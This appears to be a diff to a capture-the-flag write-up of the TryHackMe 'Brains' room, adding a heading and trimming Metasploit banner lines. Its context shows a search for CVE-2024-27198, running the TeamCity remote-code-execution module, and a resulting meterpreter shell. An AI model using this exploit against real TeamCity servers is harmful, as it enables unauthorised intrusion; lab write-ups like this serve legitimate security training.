@@ -1,5 +1,7 @@
 <code>
 
+## Brains 
+
 https://tryhackme.com/r/room/brains
 
 ### Enumeration
@@ -36,17 +38,11 @@ PORT      STATE SERVICE  VERSION
 └─$ msfconsole       
 Metasploit tip: Use the resource command to run commands from a file
 
-       =[ metasploit v6.4.18-dev                          ]
-+ -- --=[ 2437 exploits - 1255 auxiliary - 429 post       ]
-+ -- --=[ 1471 payloads - 47 encoders - 11 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
 Metasploit Documentation: https://docs.metasploit.com/
 
 msf6 > search CVE-2024-27198
 
 Matching Modules
-================
 
    #  Name                                                      Disclosure Date  Rank       Check  Description
    -  ----                                                      ---------------  ----       -----  -----------
@@ -188,7 +184,6 @@ msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run
 
 meterpreter > ls
 Listing: /opt/teamcity/TeamCity/bin
-===================================
 
 Mode              Size  Type  Last modified              Name
 ----              ----  ----  -------------              ----
